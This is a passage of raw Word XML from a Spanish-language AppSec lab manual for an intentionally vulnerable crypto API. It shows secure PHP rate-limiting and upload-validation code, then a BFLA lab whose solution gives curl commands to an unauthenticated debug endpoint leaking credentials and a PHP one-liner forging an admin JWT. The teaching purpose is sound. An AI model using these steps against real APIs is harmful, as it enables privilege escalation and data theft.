        <w:t xml:space="preserve">    $stmt-&gt;bind_param("si", $identifier, $window_seconds);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $stmt-&gt;execute();</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $result = $stmt-&gt;get_result()-&gt;fetch_assoc();</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    if ($result['attempts'] &gt;= $max_requests) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $retry_after = $window_seconds;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        http_response_code(429);</w:t>
        <w:br/>
        <w:t xml:space="preserve">        header("Retry-After: $retry_after");</w:t>
        <w:br/>
        <w:t xml:space="preserve">        echo json_encode([</w:t>
        <w:br/>
        <w:t xml:space="preserve">            "error" =&gt; "Demasiadas peticiones",</w:t>
        <w:br/>
        <w:t xml:space="preserve">            "retry_after" =&gt; $retry_after,</w:t>
        <w:br/>
        <w:t xml:space="preserve">            "max_requests" =&gt; $max_requests,</w:t>
        <w:br/>
        <w:t xml:space="preserve">            "window" =&gt; "{$window_seconds}s"</w:t>
        <w:br/>
        <w:t xml:space="preserve">        ]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">        exit;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    // Registrar peticion</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $stmt = $conn-&gt;prepare("INSERT INTO rate_limits (identifier, endpoint, created_at) VALUES (?, ?, NOW())");</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $endpoint = $_SERVER['REQUEST_URI'];</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $stmt-&gt;bind_param("ss", $identifier, $endpoint);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $stmt-&gt;execute();</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t>// Uso en reset.php</w:t>
        <w:br/>
        <w:t>$client_ip = $_SERVER['REMOTE_ADDR'];</w:t>
        <w:br/>
        <w:t>checkRateLimit("reset:$client_ip", 5, 900); // 5 intentos cada 15 minutos</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>3. Validar Tamano de Archivos</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// VULNERABLE - Sin validacion de tamano</w:t>
        <w:br/>
        <w:t>$uploaded_file = $_FILES['document'];</w:t>
        <w:br/>
        <w:t>move_uploaded_file($uploaded_file['tmp_name'], "uploads/" . $uploaded_file['name']);</w:t>
        <w:br/>
        <w:br/>
        <w:t>// SEGURO - Validacion completa de archivos</w:t>
        <w:br/>
        <w:t>$MAX_FILE_SIZE = 5 * 1024 * 1024; // 5MB maximo</w:t>
        <w:br/>
        <w:t>$ALLOWED_TYPES = ['image/jpeg', 'image/png', 'application/pdf'];</w:t>
        <w:br/>
        <w:t>$ALLOWED_EXTENSIONS = ['jpg', 'jpeg', 'png', 'pdf'];</w:t>
        <w:br/>
        <w:br/>
        <w:t>$uploaded_file = $_FILES['document'];</w:t>
        <w:br/>
        <w:br/>
        <w:t>// Verificar tamano</w:t>
        <w:br/>
        <w:t>if ($uploaded_file['size'] &gt; $MAX_FILE_SIZE) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    http_response_code(413);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    echo json_encode(["error" =&gt; "Archivo demasiado grande. Maximo permitido: 5MB"]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    exit;</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t>// Verificar tipo MIME real (no confiar en el header)</w:t>
        <w:br/>
        <w:t>$finfo = finfo_open(FILEINFO_MIME_TYPE);</w:t>
        <w:br/>
        <w:t>$real_mime = finfo_file($finfo, $uploaded_file['tmp_name']);</w:t>
        <w:br/>
        <w:t>finfo_close($finfo);</w:t>
        <w:br/>
        <w:br/>
        <w:t>if (!in_array($real_mime, $ALLOWED_TYPES)) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    http_response_code(415);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    echo json_encode(["error" =&gt; "Tipo de archivo no permitido"]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    exit;</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t>// Verificar extension</w:t>
        <w:br/>
        <w:t>$extension = strtolower(pathinfo($uploaded_file['name'], PATHINFO_EXTENSION));</w:t>
        <w:br/>
        <w:t>if (!in_array($extension, $ALLOWED_EXTENSIONS)) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    http_response_code(415);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    echo json_encode(["error" =&gt; "Extension de archivo no permitida"]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    exit;</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t>// Generar nombre seguro</w:t>
        <w:br/>
        <w:t>$safe_filename = bin2hex(random_bytes(16)) . '.' . $extension;</w:t>
        <w:br/>
        <w:t>$upload_path = "/var/uploads/kyc/" . $safe_filename;</w:t>
        <w:br/>
        <w:t>move_uploaded_file($uploaded_file['tmp_name'], $upload_path);</w:t>
        <w:br/>
        <w:br/>
        <w:t>// Tambien configurar php.ini:</w:t>
        <w:br/>
        <w:t>// upload_max_filesize = 5M</w:t>
        <w:br/>
        <w:t>// post_max_size = 6M</w:t>
        <w:br/>
        <w:t>// max_file_uploads = 1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Principios de Remediacion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Paginacion obligatoria</w:t>
      </w:r>
      <w:r>
        <w:t>: Siempre limitar la cantidad de registros devueltos. Establecer un maximo por pagina (ej: 100).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Rate limiting</w:t>
      </w:r>
      <w:r>
        <w:t>: Limitar peticiones por IP y por usuario. Aplicar limites mas estrictos en endpoints sensibles como login y reset.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Limites de tamano</w:t>
      </w:r>
      <w:r>
        <w:t>: Validar el tamano de los archivos tanto en la configuracion de PHP como en el codigo de la aplicacion.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Validacion de tipo</w:t>
      </w:r>
      <w:r>
        <w:t>: Verificar el tipo MIME real del archivo, no confiar en la extension o el Content-Type del cliente.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Cuotas de almacenamiento</w:t>
      </w:r>
      <w:r>
        <w:t>: Limitar el espacio total de almacenamiento por usuario.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Tiempos de espera</w:t>
      </w:r>
      <w:r>
        <w:t>: Configurar timeouts en las consultas a base de datos para evitar consultas que consuman demasiados recursos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>LAB 05 - Broken Function Level Authorization (BFLA)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Referencia OWASP: API5:2023 - Broken Function Level Authorization</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Objetivo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Explotar la falta de autorizacion a nivel de funcion en la API de CryptoVulnX para acceder a endpoints administrativos, ejecutar operaciones destructivas sin privilegios y obtener informacion critica del servidor a traves de un endpoint de debug sin proteccion.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Contexto</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>La vulnerabilidad BFLA (Broken Function Level Authorization) ocurre cuando una API no verifica adecuadamente si el usuario tiene los permisos necesarios para ejecutar una funcion especifica. A diferencia de BOLA (que se enfoca en el acceso a objetos), BFLA se centra en el acceso a funciones y operaciones.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>En CryptoVulnX, la autorizacion administrativa tiene multiples fallas:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Verificacion de rol basada en JWT, no en base de datos</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Los endpoints de admin verifican el claim </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>role</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> del JWT en lugar de consultar el rol real en la base de datos. Como el secreto JWT es conocido (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>crypto123</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">), cualquier usuario puede forjar un token con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>role:admin</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Verificacion inconsistente por metodo HTTP</w:t>
      </w:r>
      <w:r>
        <w:t>: Algunos endpoints verifican autorizacion para peticiones GET pero no para DELETE. Un usuario normal puede eliminar usuarios y transacciones usando el metodo DELETE.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Endpoint de debug sin autenticacion</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: El endpoint </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/api/v1/admin/debug.php</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> no requiere ningun tipo de autenticacion y expone informacion critica del servidor incluyendo credenciales de base de datos y el secreto JWT.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Endpoints Involucrados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C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Metodo</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Endpoint</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Descripcion</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/v1/admin/users.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Lista de usuarios (verifica rol solo desde JWT)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>DELETE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/v1/admin/users.php?id=X</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Eliminar usuario (no verifica rol en DELETE)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>DELETE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/v1/admin/transactions.php?id=X</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Eliminar transaccion (no verifica rol en DELETE)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/v1/admin/debug.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Informacion de debug (sin autenticacion)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Dificultad</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Media</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - Requiere manipulacion de JWT y comprension de las diferencias de autorizacion entre metodos HTTP.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Pistas</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Pista 1 - Debug sin proteccion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Explora la estructura de la API e intenta acceder a rutas comunes de administracion. El path </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/api/v1/admin/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> puede contener endpoints interesantes. ¿Que pasa si accedes a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>debug.php</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> con el parametro </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>action=info</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> directamente desde el navegador, sin ningun token?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Pista 2 - JWT forjado</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Ya conoces el secreto JWT del LAB 02 (o lo puedes obtener desde debug.php). Genera un token con el claim </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>role</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> cambiado a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>admin</w:t>
      </w:r>
      <w:r>
        <w:t>. Los endpoints de administracion confian ciegamente en el valor del JWT sin verificar contra la base de datos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Pista 3 - Metodo HTTP importa</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Los endpoints de admin verifican la autorizacion cuando recibes datos (GET), pero ¿que pasa cuando envias una peticion DELETE? Prueba a eliminar un usuario o transaccion con tu token de usuario normal usando el metodo DELETE. La verificacion de admin puede no aplicarse a todos los metodos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Solucion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Ataque 1 - Endpoint de Debug sin Autenticacion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading5"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 1 - Acceder a debug.php sin ningun token</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X GET "http://localhost/appsec/api/v1/admin/debug.php?action=info"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "server": {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "php_version": "8.2.12",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "server_software": "Apache/2.4.58",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "document_root": "/var/www/html/appsec",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "server_ip": "172.18.0.2",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "os": "Linux"</w:t>
        <w:br/>
        <w:t xml:space="preserve">  },</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "database": {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "host": "db",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "username": "cryptovulnx_admin",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "password": "Sup3rS3cr3tDB!",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "database": "cryptovulnx",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "port": 3306</w:t>
        <w:br/>
        <w:t xml:space="preserve">  },</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "jwt": {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "secret": "crypto123",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "algorithm": "HS256",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "expiration": 86400</w:t>
        <w:br/>
        <w:t xml:space="preserve">  },</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "api": {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "version": "1.0",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "debug_mode": true,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "rate_limiting": false</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Sin autenticacion alguna se obtienen credenciales de base de datos, el secreto JWT, y la configuracion completa del servidor.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Ataque 2 - Forjar JWT con Rol Admin</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading5"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 1 - Autenticarse como usuario normal</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost/appsec/api/v1/auth/login.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"username":"carlos","password":"carlos2024"}'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading5"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 2 - Generar un JWT con role:admin usando el secreto "crypto123"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>php -r '</w:t>
        <w:br/>
        <w:t>$header = base64_encode(json_encode(["alg"=&gt;"HS256","typ"=&gt;"JWT"]));</w:t>
        <w:br/>
        <w:t>$payload = base64_encode(json_encode([</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "sub" =&gt; 3,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "username" =&gt; "carlos",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "role" =&gt; "admin",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "iat" =&gt; time(),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "exp" =&gt; time() + 86400</w:t>
        <w:br/>
        <w:t>]));</w:t>
        <w:br/>
        <w:t>$header = rtrim(strtr($header, "+/", "-_"), "=");</w:t>
        <w:br/>
        <w:t>$payload = rtrim(strtr($payload, "+/", "-_"), "=");</w:t>
        <w:br/>
        <w:t>$signature = rtrim(strtr(base64_encode(hash_hmac("sha256", "$header.$payload", "crypto123", true)), "+/", "-_"), "=");</w:t>
        <w:br/>
        <w:t>echo "$header.$payload.$signature\n";</w:t>
        <w:br/>
        <w:t>'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading5"/>
      </w:pPr>
      <w:r>
